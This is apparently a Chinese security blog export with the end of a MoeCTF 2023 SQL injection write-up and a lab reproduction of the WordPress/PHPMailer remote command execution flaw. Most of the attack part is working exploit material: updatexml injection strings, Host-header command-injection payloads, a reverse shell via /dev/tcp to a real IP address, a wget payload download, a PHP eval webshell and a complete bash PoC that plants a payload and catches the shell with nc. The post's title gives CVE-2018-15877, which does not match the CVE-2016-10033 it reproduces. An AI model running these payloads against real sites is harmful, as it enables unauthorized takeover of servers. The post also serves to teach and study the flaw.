database()之类的，他只会执行1所在位置，后续就不会当做sql语句了，这又让我认为估计是sql预编译的问题吗？我也没有深究了，随后就直接开始报错注入，这里采用updatexml函数 爆表名： time=updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) 这里如下图，会看到敏感词汇secret，那估计这就是flag所在地。 ![image-20230831105450883](MoeCTF 2023-wp/image-20230831105450883.png) 爆列名： time=updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='secret_of_kokomi'),0x7e),1) ![image-20230831105648072](MoeCTF 2023-wp/image-20230831105648072.png) 爆内容： time=updatexml(1,concat(0x7e,(select group_concat(content)from secret_of_kokomi),0x7e),1) ![image-20230831105732145](MoeCTF 2023-wp/image-20230831105732145.png) 原本我以为找不到了，结果一想要注意报错注入做多能显示32位字符。于是我接着爆 time=updatexml(1,concat(0x7e,(select substring(group_concat(content),30,60)from secret_of_kokomi),0x7e),1) time=updatexml(1,concat(0x7e,(select substring(group_concat(content),80,110)from secret_of_kokomi),0x7e),1) ![image-20230831105847585](MoeCTF 2023-wp/image-20230831105847585.png) 看到了flag，接下来就改变数字得到完整的即可 moectf{Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!}","tags":["CTF赛事"],"categories":["CTF赛事"]},{"title":"WordPress 远程命令执行漏洞复现(CVE-2018-15877)","path":"/2023/08/25/wordpress-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2018-15877/","content":"0x01 漏洞简述 WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer (版本 &lt; 5.2.18) 存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。 漏洞编号： CVE-2016-10033 影响版本： WordPress &lt;= 4.7.1 PHPMailer &lt; 5.2.18 漏洞触发条件： PHP 没有开启 safe_mode（默认） 攻击者需要知道 Web 服务部署的路径 成功利用该漏洞后，攻击者可以远程任意代码执行。 0x02 漏洞搭建 这里我采用vulhub靶场搭建 进入到/vulhub/wordpress/pwnscriptum/目录后，我们执行命令： docker-compose up -d 访问对应端口即可，记得安全组放行。进去之后按要求配置信息即可，随后在转到忘记密码页面 0x03 漏洞原理 ![image-20230829150129261](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829150129261.png) 此处是管理员重置密码页面，wordpress使用phpmailer组件进行重置密码邮件的发送，但是phpmailer &lt; 5.2.18之前的版本存在命令注入漏洞，具体你可以先阅读分析文章链接 。 我们来看看这个漏洞在wordpress中的情况。漏洞文件是class.phpmailer.php，我们在wordpress中搜索查看这个文件，该文件在在wp-includes目录下。我们可以发现几行关键代码： /** * Which method to use to send mail. * Options: \"mail\", \"sendmail\", or \"smtp\". * @var string */ public $Mailer = 'mail'; /** * The path to the sendmail program. * @var string */ public $Sendmail = '/usr/sbin/sendmail'; 我们发现，实际上phpmailer组件是调用linux系统命令sendmail进行邮件发送，命令格式为：sendmail -t -i -fusername@hostname。并且我们继续审计代码发现： /** * Get the server hostname. * Returns 'localhost.localdomain' if unknown. * @access protected * @return string */ protected function serverHostname() { $result = 'localhost.localdomain'; if (!empty($this-&gt;Hostname)) { $result = $this-&gt;Hostname; } elseif (isset($_SERVER) and array_key_exists('SERVER_NAME', $_SERVER) and !empty($_SERVER['SERVER_NAME'])) { $result = $_SERVER['SERVER_NAME']; } elseif (function_exists('gethostname') &amp;&amp; gethostname() !== false) { $result = gethostname(); } elseif (php_uname('n') !== false) { $result = php_uname('n'); } return $result; } serverHostname函数通过传入的SERVER_NAME参数来获取主机名，该主机名即HTTP请求报文中的host值，但是SERVER_NAME参数并没有经过任何过滤，因此我们可以进行任意构造拼接，从而产生了系统命令注入漏洞。 更棒的是，sendmail 提供了-O和-X参数，-X参数用于写入日志文件， 我们可以使用-OQueueDirectory=/tmp/ -X/tmp/smtp.php命令组合，它会将发送的邮件保存到/tmp/smtp.php中， 那么在请求的时候payload应该类似于这样： POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1 Host: aaa( -X/tmp/smtp.php )@qq.com 在@前面，如果加上括号，将可以引入空格，这样就可以拼接到了sendmail命令中并且保存了测试邮件文件。那么如果我们写入的是Webshell后门文件呢？ 思路很好，然而现实很无奈。 wordpress方面以及PHPMailer库方面都会防止攻击者注入空字符（空格或TAB）到sendmail命令中。并且，添加括号引入向sendmail中注入参数的方法已经行不通了，具体可以参考链接。 比如我们想要调用/bin/touch的时候也会出问题，因为host字段中如果出现/，服务器会拒绝我们的请求。 因此上述的Sendmail技术在这种情况下不起作用，这条路走不通了！ 正感觉走投无路的时候，这时候我们不妨喝杯茶冷静一下，为什么sendmail能够产生命令注入漏洞呢？我们去了解一下sendmail。然后就会发现柳暗花明又一村了。我们可以知道ubuntu/debain系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。 ![image-20230829151151126](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829151151126.png) 那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现-be参数 Run Exim in expansion testing mode. Exim discards its root privilege, to prevent ordinary users from using this mode to read otherwise inaccessible files. If no arguments are given, Exim runs interactively, prompting for lines of data. Other‐ wise, it processes each argument in turn. If Exim was built with USE_READLINE=yes in Local/Makefile, it tries to load the libreadline library dynamically whenever the -be option is used without command line arguments. If successful, it uses the readline() function, which provides extensive line-editing facilities, for reading the test data. A line history is supported. Long expansion expressions can be split over several lines by using backslash continuations. As in Exim's run time configu‐ ration, white space at the start of continuation lines is ignored. Each argument or data line is passed through the string expansion mechanism, and the result is output. Vari‐ able values from the configuration file (for example, $qual‐ ify_domain) are available, but no message-specific values (such as $message_exim_id) are set, because no message is being processed (but see -bem and -Mset). Note: If you use this mechanism to test lookups, and you change the data files or databases you are using, you must exit and restart Exim before trying the same lookup again. Otherwise, because each Exim process caches the results of lookups, you will just get the same result as before. Macro processing is done on lines before string-expansion: new macros can be defined and macros will be expanded. Because macros in the config file are often used for secrets, those are only available to admin users. 下面同样也是${substr{10}{1}{$tod_log}}与${substr{0}{1}{$spool_directory}}的原理： 我们可以知道ubuntu/debain系统中，已经使用exim4替代了sendmail的功能，我们查看sendmail文件可以发现它是一个链向exim4的软链接文件。 ![image-20230825175812446](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175812446.png) 那么我们可以利用exim4的语法参数进行命令执行参数的拼接啊！我们查看exim4的帮助手册，可以发现-be参数，简单来说，-be参数是一个字符串拓展测试命令，它可以读取一些变量的数据。比如，$tod_log，它可以显示系统时间。 并且，exim4提供了一些函数用来执行一些命令，如字符串截取函数substr、$run系统调用函数。 我们可以截取空格字符。如图所示，substr函数从第十个字符开始截取，共截取一个字符，也就是时间字符串的第11个字符，是空格字符。 ![image-20230825175901430](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175901430.png) 那么同理，我们也可以截取/字符串： ![image-20230825175909679](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175909679.png) 我们测试使用$run函数调用系统命令 ![image-20230825175924125](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825175924125.png) 到这里，遇到的问题都解决了。 0x04 漏洞复现 EXP POST /wp-login.php?action=lostpassword HTTP/1.1 Host: target(any -froot@localhost -be ${run{【要执行的命令】}} null) Connection: close User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Accept: */* Content-Length: 56 Content-Type: application/x-www-form-urlencoded wp-submit=Get+New+Password&amp;redirect_to=&amp;user_login=admin 我们在数据包中将要执行的命令，插入到上述payload中指定的位置，就可以实现命令执行了。但是，这个漏洞的利用存在很大的限制，主要限制如下所示： 1.执行的命令不能包含大量特殊字符，如:、引号等。 2.命令会被转换成小写字母 3.命令需要使用绝对路径 4.需要知道某一个存在的用户的用户名 5.我们处理后的命令会执行，但是不会显示到页面上。 为了解决这些坑，漏洞作者想出了，利用 ${substr{0}{1}{$spool_directory}} 代替 / ，用 ${substr{10}{1}{$tod_log}} 代替空格的方法。 但是还是有很多字符不能用，所以我们需要将待执行的命令放到第三方网站中，然后通过 curl -o /tmp/rce example.com/shell.sh 的方法先将他下载到 /tmp 目录中，再去执行。 利用 所以，总体来说利用过程如下： 编写反弹 shell 的 exp，放到某个网页里。有如下要求： 整个 url 的大写字母会被转换成小写，所以大写小敏感的系统不要使用大写字母做文件路径 访问该网页不能跳转，因为 follow 跳转的参数是 -L （大写） 拼接成命令 /usr/bin/curl -o/tmp/rce example.com/shell.sh 和命令 /bin/bash /tmp/rce 将上述命令中的空格和 / 转换成 ${substr{10}{1}{$tod_log}} 和 ${substr{0}{1}{$spool_directory}} 拼接成 HTTP 包的 Host 头： target(any -froot@localhost -be ${run{command}} null) 依次发送这两个拼接好的数据包 复现 漏洞缺陷处在后台找回密码的地方 初始化管理员用户名和密码后访问 https://ip:8080/wp-login.php，点击忘记密码界面 ![image-20230825180517679](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825180517679.png) 这里用户名为 @1_h bcx 我们于是可以构造payload如下，该payload在/tmp/目录下创建test.txt文件： aa(any -froot@localhost -be ${run{/bin/touch /tmp/test.txt}} null) 空格 ==&gt; ${substr{10}{1}{$tod_log}} / ==&gt; ${substr{0}{1}{$spool_directory}} 转换过来就是 aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test.txt}} null) ![image-20230825191914211](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825191914211.png) 在/tmp目录下发现成功生成了测试文件。 ![image-20230825191840698](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825191840698.png) 反弹 shell 利用 curl 或者 wget 命令下载远程文件 测试下载反弹 shell： 注意： 攻击机启用 http 服务 远程 URL 中不能有 http:// 所有字母必须小写 远程反弹shell脚本：ip/a.txt，内容： bash -i &gt;&amp; /dev/tcp/124.220.233.26/12345 0&gt;&amp;1 payload： /usr/bin/wget --output-document /tmp/rce 124.220.233.26/a.txt 执行反弹shell： /bin/bash /tmp/rce 两个payload转换过来就是 aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce${substr{10}{1}{$tod_log}}124.220.233.26${substr{0}{1}{$spool_directory}}a.txt}} null) aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null) 在反弹主机上用nc监听1337端口，分别按顺序提交payload即可获取到反弹shell nc -lvnp 12345 ![image-20230829162742888](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829162742888.png) 写入一句话webshell 1.txt内容： &lt;?php @eval($_POST[1]);?&gt; 同理，可以直接下载一句话webshell，然后菜刀连接。payload： payload： aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /var/www/html/1.php 124.220.233.26/1.txt}} null) 转换过来即 aa(any -froot@localhost -be ${run{aa(any${substr{10}{1}{$tod_log}}-froot@localhost${substr{10}{1}{$tod_log}}-be${substr{10}{1}{$tod_log}}${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}1.php${substr{10}{1}{$tod_log}}ip${substr{0}{1}{$spool_directory}}1.txt}}${substr{10}{1}{$tod_log}}null)}} null) ![image-20230825203125950](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230825203125950.png) 0x05 POC 自动化提交 payload，获取反弹 shell。通过 python -mSimpleHTTPServer 80 建立 web 服务，用于目标下载 shell。运行是需要用管理员权限，因为监听了 80 端口。 使用方法 攻击机上运行./exp.sh [http://xx.xx.xx.xx/](http://xx.xx.xx.xx/)即可 其中xx.xx.xx.xx为靶机wordpress的根地址 #!/bin/bash # # __ __ __ __ __ # / / ___ ____ _____ _/ / / / / /___ ______/ /_____ __________ # / / / _ \\/ __ `/ __ `/ / / /_/ / __ `/ ___/ //_/ _ \\/ ___/ ___/ # / /___/ __/ /_/ / /_/ / / / __ / /_/ / /__/ ,&lt; / __/ / (__ ) # /_____/\\___/\\__, /\\__,_/_/ /_/ /_/\\__,_/\\___/_/|_|\\___/_/ /____/ # /____/ # # # WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit # CVE-2016-10033 # # wordpress-rce-exploit.sh (ver. 1.0) # # # Discovered and coded by # # Dawid Golunski (@dawid_golunski) # https://legalhackers.com # # ExploitBox project: # https://ExploitBox.io # # Full advisory URL: # https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html # # Exploit src URL: # https://exploitbox.io/exploit/wordpress-rce-exploit.sh # # # Tested on WordPress 4.6: # https://github.com/WordPress/WordPress/archive/4.6.zip # # Usage: # ./wordpress-rce-exploit.sh target-wordpress-url # # # Disclaimer: # For testing purposes only # # # ----------------------------------------------------------------- # # Interested in vulns/exploitation? # # # .;lc' # .,cdkkOOOko;. # .,lxxkkkkOOOO000Ol' # .':oxxxxxkkkkOOOO0000KK0x:' # .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;. # ':oxxxxxxxxxxo;. .:oOKKKXXXNNNNOl. # '';ldxxxxxdc,. ,oOXXXNNNXd;,. # .ddc;,,:c;. ,c: .cxxc:;:ox: # .dxxxxo, ., ,kMMM0:. ., .lxxxxx: # .dxxxxxc lW. oMMMMMMMK d0 .xxxxxx: # .dxxxxxc .0k.,KWMMMWNo :X: .xxxxxx: # .dxxxxxc .xN0xxxxxxxkXK, .xxxxxx: # .dxxxxxc lddOMMMMWd0MMMMKddd. .xxxxxx: # .dxxxxxc .cNMMMN.oMMMMx' .xxxxxx: # .dxxxxxc lKo;dNMN.oMM0;:Ok. 'xxxxxx: # .dxxxxxc ;Mc .lx.:o, Kl 'xxxxxx: # .dxxxxxdl;. ., .. .;cdxxxxxx: # .dxxxxxxxxxdc,. 'cdkkxxxxxxxx: # .':oxxxxxxxxxdl;. .;lxkkkkkxxxxdc,. # .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:. # .':oxxxxxxxxx.ckkkkkkkkxl,. # .,cdxxxxx.ckkkkkxc. # .':odx.ckxl,. # .,.'. # # https://ExploitBox.io # # https://twitter.com/Exploit_Box # # ----------------------------------------------------------------- rev_host=\"124.220.233.26\" function prep_host_header() { cmd=\"$1\" rce_cmd=\"\\${run{$cmd}}\"; # replace / with ${substr{0}{1}{$spool_directory}} #sed 's^/^${substr{0}{1}{$spool_directory}}^g' rce_cmd=\"`echo $rce_cmd | sed 's^/^\\${substr{0}{1}{\\$spool_directory}}^g'`\" # replace ' ' (space) with #sed 's^ ^${substr{10}{1}{$tod_log}}$^g' rce_cmd=\"`echo $rce_cmd | sed 's^ ^\\${substr{10}{1}{\\$tod_log}}^g'`\" #return \"target(any -froot@localhost -be $rce_cmd null)\" host_header=\"target(any -froot@localhost -be $rce_cmd null)\" return 0 } #cat exploitbox.ans intro=\" DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6 b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1 QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54 eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4 bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K\" intro2=\" ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09 fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09 fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1 cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg==\" echo \"$intro\" | base64 -d echo \"$intro2\" | base64 -d if [ \"$#\" -ne 1 ]; then echo -e \"Usage: $0 target-wordpress-url \" exit 1 fi target=\"$1\" echo -ne \"\\e[91m[*]\\033[0m\" read -p \" Sure you want to get a shell on the target '$target' ? [y/N] \" choice echo if [ \"$choice\" == \"y\" ]; then echo -e \"\\e[92m[*]\\033[0m Guess I can't argue with that... Let's get started... \" echo -e \"\\e[92m[+]\\033[0m Connected to the target\" # Serve payload/bash script on :80 RCE_exec_cmd=\"(sleep 3s &amp;&amp; nohup bash -i &gt;/dev/tcp/$rev_host/5555 0&lt;&amp;1 2&gt;&amp;1) &amp;\" echo \"$RCE_exec_cmd\" &gt; rce.txt python -mSimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp; hpid=$! # Save payload on the target in /tmp/rce cmd=\"/usr/bin/curl -o/tmp/rce $rev_host/rce.txt\" prep_host_header \"$cmd\" curl -H\"Host: $host_header\" -s -d 'user_login=@1_h bcx&amp;wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword echo -e \" \\e[92m[+]\\e[0m Payload sent successfully\" # Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce cmd=\"/bin/bash /tmp/rce\" prep_host_header \"$cmd\" curl -H\"Host: $host_header\" -d 'user_login=@1_h bcx&amp;wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword &amp; echo -e \" \\e[92m[+]\\033[0m Payload executed!\" echo -e \" \\e[92m[*]\\033[0m Waiting for the target to send us a \\e[94mreverse shell\\e[0m... \" nc -nvv -l -p 5555 echo else echo -e \"\\e[92m[+]\\033[0m Responsible choice ;) Exiting. \" exit 0 fi echo \"Exiting...\" exit 0 脚本需要修改的部分 三个地方 第一处 #1 line 1 rev_host=\"192.168.57.1\" #1 这边要替换成你的攻击机的ip地址，一般是和靶机处在一个局域网内的，可以提前访问下wordpress的网站进行测试。 第二处 #2 line 75 第三处 #3 line 80 curl -H\"Host: $host_header\" -s -d 'user_login=admin&amp;wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword #2 echo -e \" \\e[92m[+]\\e[0m Payload sent successfully\" # Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce cmd=\"/bin/bash /tmp/rce\" prep_host_header \"$cmd\" curl -H\"Host: $host_header\" -d 'user_login=admin&amp;wp-submit=Get+New+Password' $target/wp-login.php?action=lostpassword &amp; #3 这两个地方主要要修改的可能是user_login=admin这个参数，这个poc里默认的是admin 这里其实就是你装wordpress时管理员的或者任意一个用户的邮箱 因为找回密码时他会先判断邮箱是否存在，再进行下一步 如果这里邮箱不存在 你发包是返回200 告诉你邮箱不存在 如果是存在有的邮箱，就是返回302跳转到输入邮箱密码的界面 同时告诉你邮件已经发了 下面是burp模拟攻击时候的抓包 返回的是302时说明已经命令执行成功 ![image-20230829164046765](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829164046765.png) 可以看到靶机上也确实出现了rce文件 这边执行的命令是/usr/bin/wget --output-document /tmp/rce 124.220.233.26/a.txt ![image-20230829164134260](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829164134260.png) 这三个地方改好了之后，脚本就可以运行了 脚本的主要流程： 生成本地rce.txt 里面写的是是建立连接的命令 命令执行第一次 curl攻击机获取rce.txt 写到/tmp目录下 命令执行第二次 运行tmp目录下的rce nc连接靶机 0x06 漏洞原理深入 将docker中的wordpress源码拷贝出来sudo docker cp pwnscriptum_web_1:/var/www/html /home/jgc/code 根据忘记密码页面的urlwp-login.php?action=lostpassword定位到wp-login.php的retrieve_password函数，此函数是对密码的操作函数。 此函数中对用户输入进行处理后，最后通过以下代码发送邮件 function retrieve_password() { ...... $message = apply_filters( 'retrieve_password_message', $message, $key, $user_login, $user_data ); if ( $message &amp;&amp; !wp_mail( $user_email, wp_specialchars_decode( $title ), $message ) ) wp_die( __('The email could not be sent.') . \"&lt;br /&gt; \" . __('Possible reason: your host may have disabled the mail() function.') ); return true; } 跟进wp_mail函数，定位到/wp-includes/pluggable.php 函数中其中关于host的设置如下 if ( !isset( $from_name ) ) $from_name = 'WordPress'; if ( !isset( $from_email ) ) { // Get the site domain and get rid of www. $sitename = strtolower( $_SERVER['SERVER_NAME'] ); if ( substr( $sitename, 0, 4 ) == 'www.' ) { $sitename = substr( $sitename, 4 ); } $from_email = 'wordpress@' . $sitename; } $from_email = apply_filters( 'wp_mail_from', $from_email ); $from_name = apply_filters( 'wp_mail_from_name', $from_name ); $phpmailer-&gt;setFrom( $from_email, $from_name ); 根据代码可以看出wordpress基于$_SERVER['SERVER_NAME']来构造$from_email发送邮件的域，前面拼接上wordpress@ $_SERVER['SERVER_NAME']参数是通过请求头Host字段传入，并且这里只是简单的使用substr去掉了前面的www.，没有任何过滤措施。 在docker中添加a.php代码来查看$_SERVER['SERVER_NAME']的值 &lt;?php if (isset($_SERVER['SERVER_NAME'])){ echo $_SERVER['SERVER_NAME']; }else{ echo \"no value\"; } ?&gt; 在下图中看到就是Host字段的值 ![image-20230829160821813](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829160821813.png) 接着跟进setFrom函数，定位到wp-includes/class-phpmailer.php，发现其用到了PHPMailer组件 setFrom函数如下，这个函数对数据进行校验，没问题的话设置Sender变量为address变量的值 public function setFrom($address, $name = '', $auto = true) { $address = trim($address); $name = trim(preg_replace('/[\\r ]+/', '', $name)); //Strip breaks and trim // Don't validate now addresses with IDN. Will be done in send(). if (($pos = strrpos($address, '@')) === false or (!$this-&gt;has8bitChars(substr($address, ++$pos)) or !$this-&gt;idnSupported()) and !$this-&gt;validateAddress($address)) { $error_message = $this-&gt;lang('invalid_address') . $address; $this-&gt;setError($error_message); $this-&gt;edebug($error_message); if ($this-&gt;exceptions) { throw new phpmailerException($error_message); } return false; } $this-&gt;From = $address; $this-&gt;FromName = $name; if ($auto) { if (empty($this-&gt;Sender)) { $this-&gt;Sender = $address; } } return true; } 其中validateAddress()函数在同文件下，函数前半部分如下 if (!$patternselect or $patternselect == 'auto') { //Check this constant first so it works when extension_loaded() is disabled by safe mode //Constant was added in PHP 5.2.4 if (defined('PCRE_VERSION')) { //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2 if (version_compare(PCRE_VERSION, '8.0.3') &gt;= 0) { $patternselect = 'pcre8'; } else { $patternselect = 'pcre'; } } elseif (function_exists('extension_loaded') and extension_loaded('pcre')) { //Fall back to older PCRE $patternselect = 'pcre'; } else { //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension if (version_compare(PHP_VERSION, '5.2.0') &gt;= 0) { $patternselect = 'php'; } else { $patternselect = 'noregex'; } } } 经过测试发现$patternselect变量被设置为pcre8，因此在函数后面执行如下代码中的pcre8的case switch ($patternselect) { case 'pcre8': ... case 'pcre': ... case 'html5': ... case 'noregex': ... case 'php': default: ... } pcre8的代码注释 Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains. 基于php内置的邮箱验证的基础上做的修改 php Use PHP built-in FILTER_VALIDATE_EMAIL; 查阅php官网 ![image-20221115091819538.png](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/1668523449643126528.png) 这个验证方式允许使用括号或双引号使邮箱地址包含空格，因此在Hosts字段构造的发件人的邮箱可以是 target(any -froot@localhost -be ${run{$payload}} null)@qq.com 经过验证和过滤之后的函数调用 $phpmailer =&gt;Send() wp-includes/pluggable.php#471 =&gt;postSend() wp-includes/class-phpmailer.php#1125 =&gt;mailSend()\twp-includes/class-phpmailer.php#1247 =&gt;mailPassthru()\twp-includes/class-phpmailer.php#1368 将payload传入到mailPassthru()函数中，函数代码如下 private function mailPassthru($to, $subject, $body, $header, $params) { //Check overloading of mail function to avoid double-encoding if (ini_get('mbstring.func_overload') &amp; 1) { $subject = $this-&gt;secureHeader($subject); } else { $subject = $this-&gt;encodeHeader($this-&gt;secureHeader($subject)); } if (ini_get('safe_mode') || !($this-&gt;UseSendmailOptions)) { $result = @mail($to, $subject, $body, $header); } else { $result = @mail($to, $subject, $body, $header, $params); } return $result; } 由于没有开启安全模式，因此调用的是$result = @mail($to, $subject, $body, $header, $params); @mail是调用原生的mail()，在/wp-includes/class-phpmailer.php中定义 /** * Which method to use to send mail. * Options: \"mail\", \"sendmail\", or \"smtp\". * @var string */ public $Mailer = 'mail'; /** * The path to the sendmail program. * @var string */ public $Sendmail = '/usr/sbin/sendmail'; 查阅php手册 mail( string $to, string $subject, string $message, array|string $additional_headers = [], string $additional_params = \"\" ): bool 对第五个参数有如下描述 The additional_params parameter can be used to pass additional flags as command line options to the program configured to be used when sending mail, as defined by the sendmail_path configuration setting. For example, this can be used to set the envelope sender address when using sendmail with the -f sendmail option. This parameter is escaped by escapeshellcmd() internally to prevent command execution. escapeshellcmd() prevents command execution, but allows to add additional parameters. For security reasons, it is recommended for the user to sanitize this parameter to avoid adding unwanted parameters to the shell command. 